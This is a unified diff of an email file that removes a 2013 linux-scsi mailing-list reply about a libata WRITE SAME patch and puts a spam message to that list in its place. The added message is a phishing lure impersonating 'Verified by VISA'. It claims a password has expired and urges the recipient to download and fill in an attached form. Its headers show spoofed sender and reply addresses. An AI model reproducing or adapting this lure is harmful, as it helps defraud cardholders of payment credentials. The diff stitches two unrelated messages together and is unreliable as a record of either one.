@@ -1,37 +1,48 @@
-From: "Martin K. Petersen" <martin.petersen@oracle.com>
-Subject: Re: [PATCH] SCSI: Disable WRITE SAME for RAID and virtual host adapter drivers
-Date: Wed, 23 Oct 2013 12:29:32 -0400
-Message-ID: <yq1sivsdk7n.fsf@sermon.lab.mkp.net>
-References: <yq1eh7cffmj.fsf@sermon.lab.mkp.net>
-	<20131023161137.GA31895@infradead.org>
+From: Verified by VISA <vbv@expired.com>
+Subject: Verified by VISA Password : (expired)
+Date: 23 Oct 2013 18:45:30 +0100
+Message-ID: <20131023184530.E25FFB0F78A76C0B@expired.com>
+Reply-To: Verified@vger.kernel.org, by@vger.kernel.org,
+	  VISA@vger.kernel.org
 Mime-Version: 1.0
-Content-Type: text/plain
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0012_C54A64FF.4F8C29F9"
 Return-path: <linux-scsi-owner@vger.kernel.org>
-Received: from aserp1040.oracle.com ([141.146.126.69]:38145 "EHLO
-	aserp1040.oracle.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1752899Ab3JWQ36 (ORCPT
-	<rfc822;linux-scsi@vger.kernel.org>); Wed, 23 Oct 2013 12:29:58 -0400
-In-Reply-To: <20131023161137.GA31895@infradead.org> (Christoph Hellwig's
-	message of "Wed, 23 Oct 2013 09:11:37 -0700")
+Received: from server143-media-network-omnibus.it.net ([151.1.182.143]:41655
+	"EHLO host.infoflor.net" rhost-flags-OK-FAIL-OK-FAIL)
+	by vger.kernel.org with ESMTP id S1753296Ab3JWXC7 (ORCPT
+	<rfc822;linux-scsi@vger.kernel.org>);
+	Wed, 23 Oct 2013 19:02:59 -0400
+Received: from vbv.com (83-244-250-61.cust-83.exponential-e.net [83.244.250.61])
+	by host.infoflor.net (Postfix) with ESMTPA id 3188B7B1932
+	for <linux-scsi@vger.kernel.org>; Wed, 23 Oct 2013 19:45:28 +0200 (CEST)
 Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
-To: Christoph Hellwig <hch@infradead.org>
-Cc: "Martin K. Petersen" <martin.petersen@oracle.com>, linux-scsi@vger.kernel.org
+To: linux-scsi@vger.kernel.org
 
->>>>> "Christoph" == Christoph Hellwig <hch@infradead.org> writes:
+This is a multi-part message in MIME format.
 
->> @@ -3625,6 +3625,7 @@ int ata_scsi_add_hosts(struct ata_host *host,
->> struct scsi_host_template *sht)
-shost-> max_lun = 1; max_channel = 1; max_cmd_len = 16;
->> + shost->no_write_same = 1;
+------=_NextPart_000_0012_C54A64FF.4F8C29F9
+Content-Type: text/plain
+Content-Transfer-Encoding: 8bit
 
-Christoph> Unless I miss something this will disable TRIM support in
-Christoph> libata entirely.
 
-The flag effectively disables advertising REQ_WRITE_SAME support to the
-block layer (max_write_same_sectors). It doesn't prevent anyone from
-issuing write same commands in general. Such as the sd discard prep_fn
-and users of sg/bsg.
 
--- 
-Martin K. Petersen	Oracle Linux Engineering
+Dear Valued Customer,
+
+
+Verified by VISA Password has been terminated (expired).
+
+Previous notifications have been sent regarding this matter.
+
+To reactivate Verified by Visa , please donwloading and 
+completing the attached form
+
+Your account will be instantly reactivated after the form is 
+completed.
+
+
+Best wishes,
+Verified by VISA Team
+------=_NextPart_000_0012_C54A64FF.4F8C29F9--
+
